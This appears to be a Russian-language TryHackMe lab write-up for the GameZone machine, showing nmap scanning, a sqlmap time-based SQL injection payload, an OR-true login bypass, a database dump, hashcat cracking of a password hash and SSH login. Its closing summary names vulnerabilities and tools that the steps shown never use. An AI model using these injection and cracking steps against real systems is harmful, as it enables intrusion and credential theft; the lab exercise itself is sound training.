# TryHackMe - Win Easy - GameZone

📅 Дата: 2025-07-04  
🧠 Сложность:  
💻 IP-адрес: 10.10.220.157  

---

## Sugar

```bash
nmap_ctf() {
  local ip=$1
  sudo nmap -sS -p- -n --max-parallelism 100 --min-rate 1000 -v -oN nmap-sS.txt $ip && nmap -sT -Pn -sV -T4 -A -v -p "$(grep -oP \"^[0-9]+(?=/tcp\s+open)\" nmap-sS.txt | sort -n | paste -sd \",\")" -oN nmap-sV.txt $ip
}
```


## 🔍 Сканирование

```bash
export ip=10.10.220.157 && nmap_ctf $ip
```

### nmap:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Game Zone
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (96%), Linux 5.4 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.010 days (since Fri Jul  4 21:26:28 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
![nmap scan](screenshots/nmap_scan.png)

### sqlmap
```
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - GameZone/scans]
└─$ sqlmap -u http://10.10.220.157/index.php --method POST --data "username=*&password=pass&x=14&y=12" --dbms=mysql --technique=BT  --random-agent --flush-session --dbs
sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=' AND (SELECT 2830 FROM (SELECT(SLEEP(5)))TUir) AND 'rgkV'='rgkV&password=pass&x=14&y=12
---
available databases [5]:
[*] db
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

---

## 🕵️ Enumeration

Обход аутентификации при
login [' OR true -- -]
pass  [' OR true -- -]

Далее дамп при помощи sqlmap
```
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - GameZone/exploits]
└─$ sqlmap -r post.txt --dbms=mysql -D db -T users --dump 
---
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+
```



## 📂 Получение доступа

Сохраняю hash
```
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - GameZone/exploits]
└─$ cat hash.txt           
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
```

Запускаю hashcat
```
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - GameZone/exploits]
└─$ hashcat -m 1400 -a 0  hash.txt /media/sf_Exchange/Dictionaries/rockyou.txt

┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - GameZone/exploits]
└─$ hashcat -m 1400 -a 0  hash.txt --show                                     
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14:videogamer124
```

Получаю ssh
```
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Easy - GameZone/exploits]
└─$ ssh agent47@10.10.220.157             
The authenticity of host '10.10.220.157 (10.10.220.157)' can't be established.
ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.220.157' (ED25519) to the list of known hosts.
agent47@10.10.220.157's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ pwd
/home/agent47
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt 
649ac17b1480ac13ef1e4fa579dac95c
```



## ⚙️ Привилегии



## 🏁 Флаги

- User flag: 
- Root flag: 

---

## 📋 Резюме

🧰 **Инструменты:**
  - nmap, ffuf, и др.

🚨 **Уязвимости, которые удалось обнаружить:**  
  - Directory Traversal  
  - RCE через уязвимый скрипт  

🛡 **Советы по защите:**
  - Использовать сложные пароли и ограничить число попыток входа
  - Обновлять ПО до актуальных версий
  - Удалять/ограничивать использование SUID-бинарников
  - Настроить логирование и мониторинг системных событий
  - Применять принцип наименьших привилегий


